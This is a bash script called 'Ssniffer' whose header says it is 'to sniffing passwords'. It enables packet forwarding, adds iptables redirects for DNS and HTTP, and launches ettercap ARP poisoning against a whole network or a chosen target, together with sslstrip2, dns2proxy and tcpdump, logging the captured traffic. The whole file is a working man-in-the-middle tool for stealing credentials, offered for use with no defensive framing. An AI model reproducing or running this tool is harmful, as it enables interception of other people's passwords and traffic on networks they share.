#!/bin/bash
#Ssniffer is a script that use sslstrip2 dns2proxy dcpdump and ettercap
#use setup.sh to install correctly dependencies
#to sniffing passwords
#Author bartx <bartx @ mail.com>

#Save the starting location path
if [ $USER != 'root' ]; then
	echo "You must be root to execute the script!"
	exit
fi


location=$PWD

#Create the log folder in PWD

function start_sniffing()  {
echo "Creating log folder"
if [ -z $1 ]; then
	logfldr=$PWD/ssniffer_logs-$(date +%Y%m%d_%H%M%S)
	mkdir -p $logfldr
else
	logfldr=$1
fi
echo "Port forward activation"
# Enable Linux Kernel Packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# Flush existing iptables
#iptables -F
#iptables -F -t nat
# Traffic redirection for dns2proxy & sslstrip2
iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 5649
sleep 5

if [ "$ettercap_rule" == "all_network" ]
	then 
	echo "Starting Ettercap"
	sudo exo-open --launch TerminalEmulator "ettercap -T -i $iface -w $logfldr/ettercap.pcap -L ettercap -M arp -P autoadd -Q"
	fi
	if [ "$ettercap_rule" == "single" ]
	then 
	echo "Starting Ettercap"
	sudo exo-open --launch TerminalEmulator "ettercap -T -M arp:remote /$target// /$gateway// -w $logfldr/ettercap.pcap -i $iface"
	fi
sleep 3
echo "Starting tcpdump"
sudo exo-open --launch TerminalEmulator "tcpdump -i $iface -w $logfldr/tcpdump.pcap"
sleep 3
echo "Starting ssltrip2"
sudo exo-open --launch TerminalEmulator "sslstrip2 -p -w $logfldr/sslstrip.log -k -l 5649"
sleep 3
echo "Starting dns2proxy"
dns2proxy
clear
}

function interactive(){
echo "	       _  __  __           "
echo " ___ ___ _ __ (_)/ _|/ _| ___ _ __ "
echo "/ __/ __| '_ \| | |_| |_ / _ \ '__|"
echo "\__ \__ \ | | | |  _|  _|  __/ |   "
echo "|___/___/_| |_|_|_| |_|  \___|_|  "
echo "                           v. 0.01 by bartx"
echo ""
echo "Insert interface [wlan0]"
read iface
if [ "$iface" == "" ]
then
iface="wlan0"
fi
echo "Select the target (s for single - a for all network [a]"
read target_type
if [ "$target_type" == "" ]
then
ettercap_rule="all_network"
fi
if [ "$target_type" == "a" ]
then
ettercap_rule="all_network"
fi
if [ "$target_type" == "s" ]
then
ettercap_rule="single"
echo "Insert the gateway ip"
read gateway
echo "Insert the target ip"
read target
fi
start_sniffing
}


function cl_menu() {
echo "	       _  __  __           "
echo " ___ ___ _ __ (_)/ _|/ _| ___ _ __ "
echo "/ __/ __| '_ \| | |_| |_ / _ \ '__|"
echo "\__ \__ \ | | | |  _|  _|  __/ |   "
echo "|___/___/_| |_|_|_| |_|  \___|_|  "
echo "                           v. 0.01 by bartx"
     echo ""
     echo "usage: ssniffer -i INTERFACE [options] "
     echo ""
     echo "                 OPTIONS "
     echo "-h - Show this help"
     echo "--interactive - Interactive options selection"
     echo "-a - Sniff all the network"
     echo "-s gateway_ip target_ip - Sniff a single target"
     echo ""
     echo "                 EXAMPLES:"
     echo "ssniffer --interactive"
     echo "ssniffer -i wlan0 -a"
     echo "ssniffer -i wlan0 -s 192.168.1.1 192.168.1.75"

     exit 1
}

function check_arg() {
 if [ $# -eq 0 ]; then
 cl_menu
 exit 1
 fi
}
check_arg $@
if [ "$1" == "--interactive" ]
then
interactive
fi

if [ "$1" == "-i" ]
then
iface="$2"
	if [ "$iface" == "" ]
	then
	cl_menu
	fi
fi

if [ "$3" == "" ]
then
cl_menu
fi
if [ "$3" == "-a" ]
then
ettercap_rule="all_network"
fi

if [ "$3" == "-s" ]
	then 
	gateway="$4"
	target="$5"
		if [ "$gateway" == "" ]
		then cl_menu
		fi
	if [ "$target" == "" ]
	then cl_menu
	fi
ettercap_rule="single"
fi
start_sniffing
